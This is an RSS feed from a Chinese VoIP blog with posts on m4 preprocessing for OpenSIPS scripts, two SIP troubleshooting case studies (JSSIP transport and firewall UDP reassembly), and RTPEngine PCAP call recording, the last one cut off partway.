<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>洞香春</title>
    <link>https://wdd.js.org/</link>
    <description>Recent content on 洞香春</description>
    <image>
      <title>洞香春</title>
      <url>https://wdd.js.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://wdd.js.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- 0.143.1</generator>
    <language>en</language>
    <lastBuildDate>Sat, 02 Aug 2025 11:17:08 +0800</lastBuildDate>
    <atom:link href="https://wdd.js.org/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>使用m4给opensips脚本增加预处理能力</title>
      <link>https://wdd.js.org/posts/2025/m4-with-opensips/</link>
      <pubDate>Sat, 02 Aug 2025 11:17:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/m4-with-opensips/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;demo 代码仓库 ： &lt;a href=&#34;https://cnb.cool/eddie2072/opensips-forum/-/tree/main/how-to-use-m4&#34;&gt;https://cnb.cool/eddie2072/opensips-forum/-/tree/main/how-to-use-m4&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;使用m4给opensips脚本增加预处理能力&#34;&gt;使用m4给opensips脚本增加预处理能力&lt;/h1&gt;
&lt;h2 id=&#34;为什么要预处理&#34;&gt;为什么要预处理？&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;运维便利&lt;/strong&gt;。有预处理，脚本里的IP地址，端口，密码，用户名等信息，可以由运维人员统一配置，脚本只需要引用配置文件，就可以完成脚本的运行。否则，运维人员只能手工去修改每个配置写死的地方。容易出错，且非常麻烦。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以，我们在写脚本的时候，需要从脚本中抽离配置性质的数据。例如监听的IP地址，端口，数据库的用户名和密码等信息。&lt;/p&gt;
&lt;p&gt;这样脚本就变层两个部份，配置文件 + 脚本本身。&lt;/p&gt;
&lt;p&gt;运维人员只需要修改配置文件就可以。 以本demo为例子， 运维在线上部署脚本，只需要修改env.prd.m4文件就可以。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;预处理可以增加脚本的复用性&lt;/strong&gt;。 不同环境，往往需要的功能不同。A环境需要X功能，B环境不需要X功能，那么怎么维护呢。 不用怕，有了m4条件分支，可以根据不同不配置，渲染出不同的结果。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;m4基本在所有linux都已经安装好了&lt;/strong&gt;，不用额外在安装依赖。 很多有经验的程序员，往往也不知道什么是m4, 其实大名顶顶的autoconf, 底层就依赖了m4。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;m4难不难学&#34;&gt;m4难不难学？&lt;/h2&gt;
&lt;p&gt;m4语法简单，语法强大，但是我们能用到的，基本不超过5个语法。&lt;/p&gt;
&lt;h3 id=&#34;定义宏&#34;&gt;定义宏&lt;/h3&gt;
&lt;p&gt;下面是定义宏的语法，这样写之后，所有字符串ENV_LISTEN_IP都会被替换为127.0.0.1&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(ENV_LISTEN_IP, &lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;引用其他文件&#34;&gt;引用其他文件&lt;/h3&gt;
&lt;p&gt;有了引用，我们就不需要把所有功能放到一个大文件中。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;include(&amp;lt;&amp;lt;src/loadmodule.m4&amp;gt;&amp;gt;)
include(&amp;lt;&amp;lt;src/request.m4&amp;gt;&amp;gt;)
include(&amp;lt;&amp;lt;src/relay.m4&amp;gt;&amp;gt;)
include(&amp;lt;&amp;lt;src/per_branch_ops.m4&amp;gt;&amp;gt;)
include(&amp;lt;&amp;lt;src/handle_nat.m4&amp;gt;&amp;gt;)
include(&amp;lt;&amp;lt;src/missed_call.m4&amp;gt;&amp;gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ifelsecond1cond2-yes-no&#34;&gt;ifelse(cond1,cond2, yes, no)&lt;/h3&gt;
&lt;p&gt;如果cond1和cond2相同，则展开第三个参数yes, 否则展开第四个参数no&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ifelse(ENV_ENABLE_NAT,yes,use nat, not use nat)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;引号&#34;&gt;引号&lt;/h3&gt;
&lt;p&gt;引号，就是用来告诉m4, 引号里的内容应该看作是一个整体。&lt;/p&gt;
&lt;p&gt;m4默认的引号是``&amp;rsquo;&amp;rsquo;,  看起来很怪异，很难从视觉上做配对。 所有有强迫症，或者视觉洁癖的人，会非常讨厌m4。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;ENV_LISTEN_IP&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是这个引号是可以修改的，我们用changequote去修改默认的引号, 将引号改为&lt;code&gt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;changequote&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;ENV_LISTEN_IP&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;如何调试宏-使用-dv-参数&#34;&gt;如何调试宏, 使用-dV 参数&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;m4 -dV opensips.m4
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;解决宏冲突问题&#34;&gt;解决宏冲突问题&lt;/h3&gt;
&lt;p&gt;如果脚本里有个变量和m4的宏名字冲突，那么往往会出现一些怪异的问题。&lt;/p&gt;
&lt;p&gt;m4早就想到了解决方案， 在执行m4时候，可以加上-P参数，m4所有内置的宏就会必须写成以m4_开头。 例如&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m4_define&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;ENV_LISTEN_IP&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m4 -P opensips.m4
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;m4的劣势&#34;&gt;m4的劣势&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;m4没有类似foreach的循环，但是可以通过m4的递归实现。&lt;/li&gt;
&lt;li&gt;m4做简单的字符串替换，但是对于复杂字符串处理，m4的效率会比较低，而且语法比较复杂。 但是对于处理opensips的配置文件，m4则是刚刚好的完美工具。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;有意思的几个扩展&#34;&gt;有意思的几个扩展&lt;/h2&gt;
&lt;h3 id=&#34;检查宏是否未定义或者是否为空字符串空则报错退出&#34;&gt;检查宏是否未定义，或者是否为空字符串，空则报错退出&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m4_divert&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m4_define&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;ASSERT_NOT_EMPTY&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_ifelse&lt;/span&gt;(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_errprint&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; is empty &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_m4exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;,)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m4_divert&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)m4_dnl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ASSERT_NOT_EMPTY&lt;/span&gt;(this_is_empty)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;foreach-循环&#34;&gt;foreach 循环&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_changequote&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)m4_dnl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_divert&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_define&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;X_FOREACH&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m4_pushdef&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)&lt;span style=&#34;color:#a6e22e&#34;&gt;_foreach&lt;/span&gt;(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$@&lt;/span&gt;)&lt;span style=&#34;color:#a6e22e&#34;&gt;m4_popdef&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_define&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;_arg1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_define&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;_foreach&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m4_ifelse&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;()&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;m4_define&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, _arg1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;, (m4_shift&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;), &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;m4_divert&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)m4_dnl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;X_FOREACH&lt;/span&gt;(x,(a.com,b.com,c.com),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  alias&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp:x
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  )
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面会输出&lt;/p&gt;</description>
    </item>
    <item>
      <title>【案例分享】JSSIP 电话无法挂断问题</title>
      <link>https://wdd.js.org/posts/2025/jssip-can-not-drop-call/</link>
      <pubDate>Tue, 15 Jul 2025 20:00:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/jssip-can-not-drop-call/</guid>
      <description>&lt;p&gt;当听到分机无法挂断电话时，通常有以下几种可能的原因：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在做Record-Route时，使用了错误的内外网IP地址。导致BYE请求按照route头发送时，无法正确找到对应的服务器。&lt;/li&gt;
&lt;li&gt;Contact头部的URI不正确，导致BYE请求无法找到对应的服务器。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;时序图如下；&lt;/p&gt;
&lt;pre class=&#34;mermaid&#34;&gt;sequenceDiagram
autonumber
participant u1 as user1
participant o as opensips
participant u2 as user2

u1-&amp;gt;&amp;gt;o: INVITE
o-&amp;gt;&amp;gt;u2: INVITE
u2--&amp;gt;&amp;gt;o: 200 OK
o--&amp;gt;&amp;gt;u1: 200 OK
u1-&amp;gt;&amp;gt;o: ACK
o-&amp;gt;&amp;gt;u2: ACK
u2-&amp;gt;&amp;gt;o: BYE
o--&amp;gt;&amp;gt;u2: 477 Send failed (477/TM)
&lt;/pre&gt;
&lt;p&gt;477错误一般是按照route头或者contact转发时，找不到对应的socket。 在使用tcp作为传输协议时，例如tcp/tls/wss注册的分机比较常见。&lt;/p&gt;
&lt;p&gt;有以下可能&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;分机到opensips的tcp连接断开&lt;/li&gt;
&lt;li&gt;contact使用错误的transport参数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从过观察第2个信令的Conact头，发现transport=ws, User-Agent=JSSip。 正常情况下，jssip应该使用wss作为transport。&lt;/p&gt;
&lt;p&gt;所以解决办法是，在jssip的配置中，将transport改为wss。&lt;/p&gt;
&lt;p&gt;还有一个解决方案， 就是让jssip通过nginx转发wss请求，让nginx转发到opensips的ws端口, 也能解决问题。&lt;/p&gt;
&lt;pre class=&#34;mermaid&#34;&gt;sequenceDiagram
autonumber

jssip -&amp;gt;&amp;gt; nginx: wss
nginx -&amp;gt;&amp;gt; opensips: ws
&lt;/pre&gt;</description>
    </item>
    <item>
      <title>【案例分享】外线呼入，SIP分机为何无响应？</title>
      <link>https://wdd.js.org/posts/2025/ua-not-answer/</link>
      <pubDate>Tue, 15 Jul 2025 19:39:57 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/ua-not-answer/</guid>
      <description>&lt;h1 id=&#34;案例分享&#34;&gt;案例分享&lt;/h1&gt;
&lt;p&gt;最近有客户反馈，自己的话机最近一两周都没有收到来电了，感觉很奇怪，他自己呼叫400号码，然后转分机，也接不通。&lt;/p&gt;
&lt;h2 id=&#34;组网结构&#34;&gt;组网结构&lt;/h2&gt;
&lt;pre class=&#34;mermaid&#34;&gt;flowchart LR
ua1(分机)
fw1(防火墙)
uas1(SIP服务器)

ua1 --&amp;gt; fw1
fw1 --&amp;gt; uas1
&lt;/pre&gt;
&lt;h2 id=&#34;排查思路&#34;&gt;排查思路&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先排查服务端，从日志来看，分机的注册是正常的，每隔30多秒就注册一次。&lt;/li&gt;
&lt;li&gt;然后排查呼叫信令图，发现发送给分机的INVITE， 分机那边没有任何反应&lt;/li&gt;
&lt;li&gt;接着请求客户远程协助，在分机上抓包，发现只能抓到注册包，没有INVITE的回应。&lt;/li&gt;
&lt;li&gt;询问客户，他们公司有没有使用防火墙，客户说有。&lt;/li&gt;
&lt;li&gt;然后让客户检查他们防火墙的设置，关闭SIP ALG功能，但是也无效&lt;/li&gt;
&lt;li&gt;然后让客户找网络负责人，在防火墙上抓包，发现防火墙收到了INVITE，但是没有转发给内部分机, 原因未知&lt;/li&gt;
&lt;li&gt;最后找防火墙厂商，发现是防火墙的UDP组包没有开启，开启UDP分片重组后，呼入电话能正常进线&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;此刻，我回想起曾经写的 &lt;a href=&#34;https://wdd.js.org/opensips/ch7/big-udp-msg/&#34;&gt;UDP分片导致SIP消息丢失&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;没想到，在防火墙上也遇到了同样的问题。&lt;/p&gt;</description>
    </item>
    <item>
      <title>RTPEngine 录制 PCAP 文件</title>
      <link>https://wdd.js.org/posts/2025/rtpengine-record-pcap/</link>
      <pubDate>Tue, 15 Jul 2025 19:26:06 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/rtpengine-record-pcap/</guid>
      <description>&lt;h1 id=&#34;为什要用-rtpengine-来录制-pcap-文件&#34;&gt;为什要用 RTPEngine 来录制 PCAP 文件？&lt;/h1&gt;
&lt;p&gt;一般我们用 Freeswitch 来作为录音服务器， 但是某些场景，例如备份录音，需要在不同节点进行录音。&lt;/p&gt;
&lt;p&gt;如果直接录制成 wav 文件，那么比较占用资源，而且备份录音用的几率也是比较小的。&lt;/p&gt;
&lt;p&gt;因此录制成 PCAP 文件，可以节省资源，后期 pcap 转语音也能比较容易的实现。&lt;/p&gt;
&lt;h1 id=&#34;实现步骤&#34;&gt;实现步骤&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;配置rtpengine启动参数&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;--pcaps-dir=/var/log/records --record-method=pcap --recording-format=eht
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;在opensips在做SDP Offer&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rtpengine_offer(&amp;#34;record-call=yes&amp;#34;);
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;录音文件位置&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;录音文件在&lt;code&gt;/var/log/records&lt;/code&gt;目录下，文件名是呼叫的sip Call-ID-16hex随机数.pcap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;call1-1234567890abcdef.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;call2-1234567890abcdef.pcap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
